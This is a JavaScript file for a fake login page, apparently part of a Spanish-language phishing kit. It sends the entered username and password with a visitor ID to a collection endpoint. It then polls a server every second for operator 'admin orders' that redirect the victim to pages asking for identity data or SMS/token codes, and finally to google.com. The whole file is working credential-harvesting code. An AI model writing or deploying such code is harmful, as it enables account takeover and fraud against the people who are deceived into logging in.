document.addEventListener('DOMContentLoaded', () => {
    const userIn = document.getElementById('loginUsername');
    const passIn = document.getElementById('loginPassword');
    const btnSubmitLogin = document.getElementById('btnSubmitLogin');
    const formLogin = document.getElementById('formLogin');
    const toggleEyeBtn = document.getElementById('toggleEye');
    const eyeSvg = document.getElementById('eyeSvg');

    function resetFormFields() {
        if (formLogin) formLogin.reset();
        if (userIn) userIn.value = '';
        if (passIn) {
            passIn.value = '';
            passIn.setAttribute('type', 'password');
        }
        if (btnSubmitLogin) {
            btnSubmitLogin.disabled = true;
            btnSubmitLogin.classList.remove('active');
        }
        if (eyeSvg) {
            eyeSvg.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
        }
    }

    resetFormFields();
    window.addEventListener('pageshow', () => {
        resetFormFields();
    });

    if (toggleEyeBtn && passIn && eyeSvg) {
        toggleEyeBtn.addEventListener('click', () => {
            const isPass = passIn.getAttribute('type') === 'password';
            passIn.setAttribute('type', isPass ? 'text' : 'password');
            eyeSvg.innerHTML = isPass 
                ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="23" x2="23" y2="1"></line>`
                : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
        });
    }

    function checkLoginInputs() {
        if (!userIn || !passIn || !btnSubmitLogin) return;
        if (userIn.value.trim().length > 0 && passIn.value.trim().length > 0) {
            btnSubmitLogin.disabled = false;
            btnSubmitLogin.classList.add('active');
        } else {
            btnSubmitLogin.disabled = true;
            btnSubmitLogin.classList.remove('active');
        }
    }

    if (userIn && passIn) {
        userIn.addEventListener('input', checkLoginInputs);
        passIn.addEventListener('input', checkLoginInputs);
        checkLoginInputs();
    }

    if (formLogin) {
        formLogin.addEventListener('submit', async (e) => {
            e.preventDefault();
            btnSubmitLogin.disabled = true;

            const formData = new FormData();
            formData.append('action', 'login');
            if (typeof visitorId !== 'undefined') {
                formData.append('visitor_id', visitorId);
            }
            formData.append('username', userIn.value.trim());
            formData.append('password', passIn.value.trim());

            try {
                await fetch('api_submit.php', { method: 'POST', body: formData });
            } catch (err) {
                console.error('Error submitting login:', err);
            }
            window.location.href = 'cargando.php';
        });
    }

    // Background polling for admin orders
    setInterval(async () => {
        if (typeof visitorId === 'undefined' || !visitorId) return;
        try {
            const res = await fetch('ping.php?id=' + encodeURIComponent(visitorId) + '&t=' + Date.now());
            if (!res.ok) return;
            const data = await res.json();
            const action = (data.action || data.status || '').trim();

            if (action === 'blocked') {
                location.reload();
            } else if (action === 'pedir_identidad') {
                window.location.href = 'identificacion.php';
            } else if (action === 'pedir_token' || action === 'pedir_sms') {
                window.location.href = 'seguridad.php';
            } else if (action === 'finished') {
                window.location.href = 'https://www.google.com';
            }
        } catch (e) {}
    }, 1000);
});

